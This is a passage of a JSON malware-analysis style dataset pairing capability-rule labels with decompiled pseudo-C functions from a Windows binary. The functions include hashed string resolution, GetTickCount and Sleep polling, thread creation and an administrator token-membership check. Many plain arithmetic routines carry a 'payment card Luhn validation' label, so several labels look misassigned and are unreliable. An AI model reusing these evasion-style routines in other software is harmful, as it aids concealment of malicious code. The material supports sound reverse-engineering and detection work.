        "decompiled_code": "\nuint __cdecl fcn.0040a5cd(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t n;\n    uint *unaff_ESI;\n    ulong uVar1;\n    \n    n = arg_10h[1];\n    if (arg_10h[1] < arg_ch[1]) {\n        n = arg_ch[1];\n    }\n    if (n < *(arg_8h + 4)) {\n        n = *(arg_8h + 4);\n    }\n    fcn.0040a29a(n);\n    fcn.0040a29a(n);\n    fcn.0040a29a(n);\n    fcn.0040a29a(n);\n    fcn.0040dcdf(*unaff_ESI, *arg_ch, *arg_10h);\n    uVar1 = fcn.0040cf67(*unaff_ESI);\n    unaff_ESI[1] = uVar1;\n    return uVar1 >> 0x20;\n}\n",
        "token_count": 231
    },
    "0040a64b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a64b(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t n;\n    uint *unaff_ESI;\n    ulong uVar1;\n    \n    n = arg_10h[1];\n    if (arg_10h[1] < arg_ch[1]) {\n        n = arg_ch[1];\n    }\n    if (n < arg_8h[1]) {\n        n = arg_8h[1];\n    }\n    fcn.0040a29a(n);\n    fcn.0040a29a(n);\n    fcn.0040a29a(n);\n    fcn.0040a29a(n);\n    fcn.0040d48c(*unaff_ESI, *arg_8h, *arg_ch, *arg_10h);\n    uVar1 = fcn.0040cf67(*unaff_ESI);\n    unaff_ESI[1] = uVar1;\n    return uVar1 >> 0x20;\n}\n",
        "token_count": 233
    },
    "0040a6c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a6c5(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    ulong uVar2;\n    \n    puVar1 = arg_8h;\n    arg_8h = arg_ch[1];\n    if (arg_ch[1] <= in_EAX[1]) {\n        arg_8h = in_EAX[1];\n    }\n    fcn.0040a29a(arg_8h);\n    fcn.0040a29a(arg_8h);\n    fcn.0040a29a(arg_8h);\n    fcn.0040d4e1(*puVar1, *arg_ch, *in_EAX);\n    uVar2 = fcn.0040cf67(*puVar1);\n    puVar1[1] = uVar2;\n    return uVar2 >> 0x20;\n}\n",
        "token_count": 205
    },
    "0040a731": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a731(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    ulong uVar2;\n    \n    puVar1 = arg_8h;\n    arg_8h = arg_ch[1];\n    if (arg_ch[1] <= in_EAX[1]) {\n        arg_8h = in_EAX[1];\n    }\n    fcn.0040a29a(arg_8h);\n    fcn.0040a29a(arg_8h);\n    fcn.0040a29a(arg_8h);\n    fcn.0040d6fd(*puVar1, *arg_ch, *in_EAX);\n    uVar2 = fcn.0040cf67(*puVar1);\n    puVar1[1] = uVar2;\n    return uVar2 >> 0x20;\n}\n",
        "token_count": 202
    },
    "0040a7ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040a7ed(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EDI;\n    \n    uVar3 = 0;\n    cVar1 = fcn.00409e78(param_1);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00409e9f(param_2, 0x40);\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.00406338(0);\n            if (iVar2 != 0) {\n                iVar2 = fcn.0040e1f9(0xa8);\n                if (iVar2 == 0) {\n                    iVar2 = fcn.0040e4b1(param_1, unaff_EDI << 3, 0);\n                    if (iVar2 == 0) {\n                        fcn.0040e73a(param_2);\n                    }\n                }\n                fcn.00406445();\n            }\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 253
    },
    "0040b360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040b360(char param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    uint8_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    if (param_1 < 'j') {\n        if (param_1 != 'i') {\n            if (param_1 == 'C') {\n                if (param_2 == '\\0') {\n                    uVar1 = *(in_EAX + 1) & 0x10;\ncode_r0x0040b3ad:\n                    bVar3 = uVar1 != 0;\n                }\n                else {\n                    uVar1 = *(in_EAX + 1) & 0x10;\ncode_r0x0040b405:\n                    bVar3 = uVar1 == 0;\n                }\n                iVar2 = bVar3 + 1;\ncode_r0x0040b3b1:\n                *in_EAX = iVar2;\n                goto code_r0x0040b451;\n            }\n            if (param_1 == 'P') {\n                in_EAX[1] = in_EAX[1] | 0x20;\n                goto code_r0x0040b3de;\n            }\n            if (param_1 == 'S') {\n                if (param_2 != '\\0') {\n                    uVar1 = in_EAX[1] & 0x50;\n                    goto code_r0x0040b3ce;\n                }\n                uVar1 = *(in_EAX + 1) & 0x50;\ncode_r0x0040b43d:\n                iVar2 = (uVar1 != 0) + 3;\n                goto code_r0x0040b3b1;\n            }\n            if (param_1 == 'X') {\n                in_EAX[1] = in_EAX[1] | 0x20;\n                goto code_r0x0040b3ec;\n            }\n            if (param_1 == 'c') {\n                if (param_2 != '\\0') {\n                    uVar1 = *(in_EAX + 1) & 8;\n                    goto code_r0x0040b3ad;\n                }\n                uVar1 = *(in_EAX + 1) & 8;\n                goto code_r0x0040b405;\n            }\n            if (param_1 != 'd') goto code_r0x0040b420;\n        }\n        *in_EAX = 5;\n    }\n    else {\n        if (param_1 == 'o') {\n            *in_EAX = 8;\n            goto code_r0x0040b451;\n        }\n        if (param_1 == 'p') {\ncode_r0x0040b3de:\n            in_EAX[1] = in_EAX[1] | 0x804;\n            in_EAX[2] = 8;\n        }\n        else {\n            if (param_1 == 's') {\n                if (param_2 != '\\0') {\n                    uVar1 = *(in_EAX + 1) & 0x48;\n                    goto code_r0x0040b43d;\n                }\n                uVar1 = in_EAX[1] & 0x48;\ncode_r0x0040b3ce:\n                iVar2 = 4 - (uVar1 != 0);\n                goto code_r0x0040b3b1;\n            }\n            if (param_1 == 'u') {\n                *in_EAX = 6;\n                goto code_r0x0040b451;\n            }\n            if (param_1 != 'x') {\ncode_r0x0040b420:\n                *in_EAX = 0;\n                goto code_r0x0040b451;\n            }\n        }\ncode_r0x0040b3ec:\n        *in_EAX = 7;\n    }\ncode_r0x0040b451:\n    return *in_EAX;\n}\n",
        "token_count": 871
    },
    "0040bde1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040bde1(uint32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    uVar1 = param_1 * 0x95 & param_1;\n    *0x414008 = *0x414008 >> (param_1 & 0x1f) ^ 0x3795e3 ^ uVar1;\n    iVar2 = (param_1 + 0xea ^ uVar1) * *0x414008;\n    if ((iVar2 < param_1 - 0xed) || (iVar2 != 0)) {\n        *0x414008 = *0x414008 * iVar2;\n    }\n    return *0x414007;\n}\n",
        "token_count": 167
    },
    "0040c9ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c9ae(uint32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 0;\n    if (param_4 != 0) {\n        param_2 = param_2 - param_1;\n        param_3 = param_3 - param_1;\n        do {\n            uVar2 = *(param_2 + param_1) + uVar1;\n            *param_1 = uVar2;\n            uVar1 = uVar2 < uVar1;\n            *param_1 = *param_1 + *(param_3 + param_1);\n            if (*param_1 < *(param_3 + param_1)) {\n                uVar1 = uVar1 + 1;\n            }\n            param_1 = param_1 + 1;\n            param_4 = param_4 + -1;\n        } while (param_4 != 0);\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "0040c9e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c9e9(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = arg_ch;\n    arg_ch = 0;\n    if (iVar2 != 0) {\n        iVar3 = in_EAX - in_ECX;\n        arg_8h = arg_8h - in_ECX;\n        do {\n            uVar1 = *(iVar3 + in_ECX) - arg_ch;\n            *in_ECX = uVar1;\n            arg_ch = -arg_ch - 1 < uVar1;\n            *in_ECX = *in_ECX - *(arg_8h + in_ECX);\n            uVar1 = -*(arg_8h + in_ECX) - 1;\n            if (uVar1 <= *in_ECX && *in_ECX != uVar1) {\n                arg_ch = arg_ch + 1;\n            }\n            in_ECX = in_ECX + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return arg_ch;\n}\n",
        "token_count": 281
    },
    "0040ca3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ca3a(uint arg_8h, int32_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint *puVar4;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t *var_8h;\n    \n    iVar1 = arg_10h * 2;\n    puVar4 = in_EAX;\n    if (iVar1 != 0) {\n        for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (arg_10h != 0) {\n        var_8h = in_EAX + arg_10h;\n        var_ch = in_EAX - arg_ch;\n        var_14h = arg_10h;\n        do {\n            uVar2 = 0;\n            if (*arg_ch == 0) {\n                *var_8h = 0;\n            }\n            else {\n                var_10h = 0;\n                puVar3 = var_ch + arg_ch;\n                do {\n                    fcn.0040be29(&var_1ch);\n                    if (var_1ch + var_10h < var_10h) {\n                        var_18h = var_18h + 1;\n                    }\n                    var_1ch = var_1ch + var_10h + *puVar3;\n                    if (var_1ch < *puVar3) {\n                        var_18h = var_18h + 1;\n                    }\n                    *puVar3 = var_1ch;\n                    var_10h = var_18h;\n                    uVar2 = uVar2 + 1;\n                    puVar3 = puVar3 + 1;\n                } while (uVar2 < arg_10h);\n                *var_8h = var_18h;\n            }\n            var_8h = var_8h + 1;\n            arg_ch = arg_ch + 1;\n            var_14h = var_14h - 1;\n        } while (var_14h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 540
    },
    "0040cfad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040cfad(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint *in_EAX;\n    \n    if (param_2 != 0) {\n        param_3 = param_3 - in_EAX;\n        do {\n            *in_EAX = *(param_3 + in_EAX);\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "0040d219": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d219(uint arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = 0;\n    if (arg_ch == 0) {\n        if (in_ECX != 0) {\n            for (; in_ECX != 0; in_ECX = in_ECX + -1) {\n                *in_EAX = 0;\n                in_EAX = in_EAX + 1;\n            }\n        }\n        uVar1 = 0;\n    }\n    else {\n        var_4h = in_ECX;\n        if (in_ECX != 0) {\n            do {\n                fcn.0040be29(&var_ch);\n                *in_EAX = var_ch + uVar1;\n                if (var_ch + uVar1 < uVar1) {\n                    var_8h = var_8h + 1;\n                }\n                in_EAX = in_EAX + 1;\n                var_4h = var_4h + -1;\n                uVar1 = var_8h;\n            } while (var_4h != 0);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 305
    },
    "0040d366": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d366(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t extraout_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    \n    fcn.0040cfc5();\n    uVar1 = 0;\n    iVar4 = extraout_EDX + -1;\n    if (arg_ch != 0) {\n        do {\n            if (iVar4 < 0) {\n                return;\n            }\n            uVar5 = 0;\n            iVar3 = 0;\n            do {\n                if (0x1f < iVar3) break;\n                uVar2 = iVar3;\n                iVar3 = iVar3 + 8;\n                uVar5 = uVar5 | *(iVar4 + arg_10h) << (uVar2 & 0x1f);\n                iVar4 = iVar4 + -1;\n            } while (-1 < iVar4);\n            *(arg_8h + uVar1 * 4) = uVar5;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "0040d411": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d411(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    int32_t arg_8h_00;\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0040bd94();\n    arg_ch_00 = fcn.0040bd94();\n    fcn.0040cb05(arg_8h_00, arg_ch_00, arg_ch, arg_10h, arg_14h, in_EAX);\n    fcn.0040cfad(arg_ch_00);\n    if (arg_ch_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    if (arg_8h_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    return 0;\n}\n",
        "token_count": 224
    },
    "0040d48c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d48c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.0040bd94();\n    fcn.0040ca3a(arg_ch, arg_10h, in_EAX);\n    fcn.0040d411(arg_8h, arg_ch_00, in_EAX * 2, arg_14h);\n    if (arg_ch_00 != 0) {\n        fcn.0040cfc5();\n    }\n    fcn.0040bda8();\n    return 0;\n}\n",
        "token_count": 165
    },
    "0040e1f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040e1f9(uint32_t param_1)\n\n{\n    uint *unaff_ESI;\n    uint uStack12;\n    \n    if (unaff_ESI == NULL) {\n        uStack12 = 3;\n    }\n    else {\n        *0x42f18c = 1;\n        sub.ntdll.dll_memset();\n        unaff_ESI[0x5a] = 0;\n        *unaff_ESI = 0x200;\n        unaff_ESI[0x5b] = 0x40;\n        if (param_1 < 0x100) {\n            *0x42f1e4 = 0;\n            unaff_ESI[0x5c] = param_1;\n            unaff_ESI[0x43] = 1;\n            unaff_ESI[0x5d] = 1;\n            uStack12 = 0;\n        }\n        else {\n            uStack12 = 0x11;\n        }\n    }\n    return uStack12;\n}\n",
        "token_count": 227
    },
    "0040e5d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040e5d2(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t *unaff_ESI;\n    uchar *puVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00405e30(0x412870, 0x10, 0xc9c7e236, 0);\n    if (unaff_ESI == NULL) {\n        uVar2 = 3;\n    }\n    else {\n        if (0 < *unaff_ESI + 7 + (*unaff_ESI + 7 >> 0x1f & 7U) >> 3) {\n            piVar3 = unaff_ESI + 2;\n            puVar4 = unaff_ESI + 0x89;\n            do {\n                puVar4[-1] = *((*piVar3 >> 4) + iVar1);\n                *puVar4 = *((*piVar3 & 0xf) + iVar1);\n                piVar3 = piVar3 + 1;\n                puVar4 = puVar4 + 2;\n            } while ((-8 - unaff_ESI) + piVar3 < *unaff_ESI + 7 + (*unaff_ESI + 7 >> 0x1f & 7U) >> 3);\n        }\n        *((*unaff_ESI + 3 + (*unaff_ESI + 3 >> 0x1f & 3U) >> 2) + 0x88 + unaff_ESI) = 0;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 377
    },
    "0040f651": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040f651(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_4h;\n    \n    cVar1 = fcn.00409f40(arg_8h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040f1ec();\n        if (cVar1 == '\\0') {\n            fcn.0040f1fe();\n        }\n        arg_8h_00 = fcn.0040f296(5);\n        if ((arg_8h_00 == 0) || (iVar2 = fcn.0040fcde(arg_8h_00, arg_8h, &var_4h),  iVar2 == 0)) {\n            fcn.0040f362();\n            arg_8h_00 = 0;\n        }\n        else if (arg_ch != NULL) {\n            *arg_ch = iVar2 - arg_8h;\n        }\n        iVar2 = 0;\n        if (arg_8h_00 != 0) {\n            iVar2 = arg_8h_00;\n        }\n        return iVar2;\n    }\n    return 0;\n}\n",
        "token_count": 305
    },
    "0040f6d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040f6d6(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t *unaff_ESI;\n    \n    uVar1 = (*_sym.imp.SHLWAPI.dll_StrSpnA)();\n    if (uVar1 != 0) {\n        if (uVar1 < *unaff_ESI) {\n            *unaff_ESI = *unaff_ESI - uVar1;\n            in_EAX = in_EAX + uVar1;\n        }\n        else {\n            in_EAX = 0;\n        }\n    }\n    return in_EAX;\n}\n",
        "token_count": 141
    },
    "0040f6fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f6fc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *unaff_EDI;\n    \n    *unaff_EDI = *unaff_EDI - in_EAX;\n    iVar1 = *unaff_EDI;\n    uVar2 = fcn.00405e30(0x4128b4, 4, 0x516ada57, 0);\n    iVar3 = fcn.0040f6d6(uVar2);\n    iVar4 = arg_8h + in_EAX;\n    if (iVar3 != 0) {\n        *unaff_EDI = iVar1;\n        iVar4 = iVar3;\n    }\n    return iVar4;\n}\n",
        "token_count": 194
    },
    "0040f741": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f741(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00405e30(0x4128b4, 4, 0x516ada57, 0);\n    var_4h = fcn.0040f6d6(uVar1);\n    if (var_4h != 0) {\n        var_10h = 0;\n        var_ch = 0;\n        uVar1 = fcn.00405e30(0x4128a4, 5, 0x228c6e55, 0);\n        iVar2 = fcn.00409647(uVar1, &var_10h);\n        if (iVar2 == 0) {\n            var_4h = 0;\n        }\n        else {\n            *(arg_8h + 0x20) = var_10h;\n            *(arg_8h + 0x24) = var_ch;\n            uVar1 = fcn.00405e30(0x4128bc, 0xf, 0xd51de119, 0);\n            var_4h = fcn.0040f6d6(uVar1);\n            if (var_4h != 0) {\n                uVar1 = fcn.00405e30(0x4128b4, 4, 0x516ada57, 0);\n                var_4h = fcn.0040f6d6(uVar1);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 384
    },
    "0040fcde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040fcde(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *arg_ch_00;\n    int32_t iVar4;\n    \n    uVar3 = fcn.00405e30(0x4128b4, 4, 0x516ada57, 0);\n    arg_ch_00 = fcn.0040f6d6(uVar3);\n    if (arg_ch_00 != NULL) {\n        uVar3 = fcn.00405e30(0x4128ac, 4, 0x96943865, 0);\n        pcVar2 = _sym.imp.SHLWAPI.dll_StrCmpNIA;\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpNIA)(arg_ch_00, uVar3, 4);\n        if (iVar4 == 0) {\n            arg_ch_00 = fcn.0040f6fc(arg_ch_00);\n            *(arg_8h + 0x14) = 1;\n        }\n        else {\n            uVar3 = fcn.00405e30(0x41289c, 5, 0xf06a508a, 0);\n            iVar4 = (*pcVar2)(arg_ch_00, uVar3, 5);\n            if (iVar4 == 0) {\n                *(arg_8h + 0x20) = 0;\n                arg_ch_00 = fcn.0040f6fc(arg_ch_00);\n                *(arg_8h + 0x14) = 0;\n            }\n            else {\n                uVar3 = fcn.00405e30(0x412894, 4, 0x78eba6a5, 0);\n                iVar4 = (*pcVar2)(arg_ch_00, uVar3, 4);\n                if (iVar4 == 0) {\n                    *(arg_8h + 0x20) = 1;\n                    arg_ch_00 = fcn.0040f6fc(arg_ch_00);\n                    *(arg_8h + 0x14) = 0;\n                }\n                else {\n                    cVar1 = *arg_ch_00;\n                    if (cVar1 == '\\\"') {\n                        arg_ch_00 = fcn.0040f803(arg_8h, arg_ch_00, arg_10h);\n                        *(arg_8h + 0x14) = 3;\n                    }\n                    else if ((cVar1 == '-') || (('/' < cVar1 && (cVar1 < ':')))) {\n                        arg_ch_00 = fcn.0040f741(arg_8h, arg_ch_00);\n                        *(arg_8h + 0x14) = 2;\n                    }\n                    else if (cVar1 == '[') {\n                        arg_ch_00 = fcn.0040fabf(arg_8h, arg_ch_00);\n                        *(arg_8h + 0x14) = 4;\n                    }\n                    else if (cVar1 == '{') {\n                        arg_ch_00 = fcn.0040fb9b(arg_8h, arg_ch_00, arg_10h);\n                        *(arg_8h + 0x14) = 5;\n                    }\n                    else {\n                        arg_ch_00 = NULL;\n                    }\n                }\n            }\n        }\n    }\n    return arg_ch_00;\n}\n",
        "token_count": 775
    },
    "00401186": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00401186(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_SetEvent)(*0x42e408);\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x42e438, 0xffffffff);\n    fcn.00408489();\n    *0x42e408 = 0;\n    fcn.00408489();\n    *0x42e438 = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "0040457a": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint32_t fcn.0040457a(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    uVar5 = 0;\n    if (*0x42e998 == 0) {\n        fcn.004024e6(0x42e998);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetTickCount;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    iVar3 = (*pcVar1)();\n    do {\n        uVar4 = iVar3 - iVar2;\n        if (59999 < uVar4) {\ncode_r0x004045d2:\n            return uVar4 & 0xffffff00 | uVar5;\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_OpenEventW)(0x1f0003, 0, 0x42e998);\n        if (uVar4 != 0) {\n            uVar5 = 1;\n            goto code_r0x004045d2;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1);\n        iVar3 = (*pcVar1)();\n    } while( true );\n}\n",
        "token_count": 276
    },
    "00409bda": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nbool fcn.00409bda(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    int32_t iVar3;\n    bool bVar4;\n    \n    cVar1 = fcn.00409ec6();\n    if (cVar1 == '\\0') {\n        bVar4 = false;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_SetFileAttributesW)();\n        iVar3 = 0;\n        while( true ) {\n            cVar1 = fcn.00409b60(unaff_ESI);\n            bVar4 = cVar1 != '\\0';\n            if ((bVar4) || (0x14 < iVar3)) break;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 2) {\n                return iVar2 == 2;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(10);\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 226
    },
    "004011c7": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nvoid fcn.004011c7(void)\n\n{\n    *0x42e408 = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 1, 0, 0);\n    *0x42e438 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x40115d, 0, 0, 0);\n    return;\n}\n",
        "token_count": 87
    },
    "0040a1f6": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\nint32_t fcn.0040a1f6(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = fcn.00406338(0);\n    puVar1[1] = param_2;\n    *puVar1 = param_1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x40a1b3, puVar1, 0, 0);\n    if (iVar2 == 0) {\n        fcn.00406445();\n    }\n    return iVar2;\n}\n",
        "token_count": 140
    },
    "00405da9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405da9(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint var_168h;\n    uint32_t var_8h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId;\n    *0x414be4 = *0x414be4 | *0x4148e1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    if (*0x42ecdc != iVar3) {\n        *0x42f188 = 0;\n        cVar2 = fcn.00405cd4(*0x42e198, *0x42e19c);\n        *0x414be4 = *0x414be4 >> (cVar2 * 'j' & 0x1fU);\n        fcn.00409ccd();\n        *0x414be4 = *0x414be4 ^ var_8h;\n        *0x42ecdc = (*pcVar1)();\n        *0x414be4 = *0x414be4 << (var_168h * 'B' & 0x1fU);\n    }\n    *0x414be4 = *0x414be4 << (var_168h * 'B' & 0x1fU);\n    return;\n}\n",
        "token_count": 309
    },
    "004098f8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get token membership"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004098f8(void)\n\n{\n    int32_t iVar1;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    uint SidToCheck;\n    int32_t IsMember;\n    \n    pIdentifierAuthority = 0;\n    var_ch._0_2_ = 0x500;\n    IsMember = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                         (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &SidToCheck);\n    if (IsMember != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, SidToCheck, &IsMember);\n        if (iVar1 == 0) {\n            IsMember = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(SidToCheck);\n    }\n    return IsMember;\n}\n",
        "token_count": 220
    },
    "0040cad9": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040cad9(uint32_t arg_8h)\n\n{\n    uint32_t unaff_ESI;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    \n    fcn.0040be29(&var_ch);\n    if (var_8h < unaff_ESI) {\n        return false;\n    }\n    if (unaff_ESI < var_8h) {\n        return true;\n    }\n    return arg_8h < var_ch;\n}\n",
        "token_count": 109
    },
    "0040f37a": {
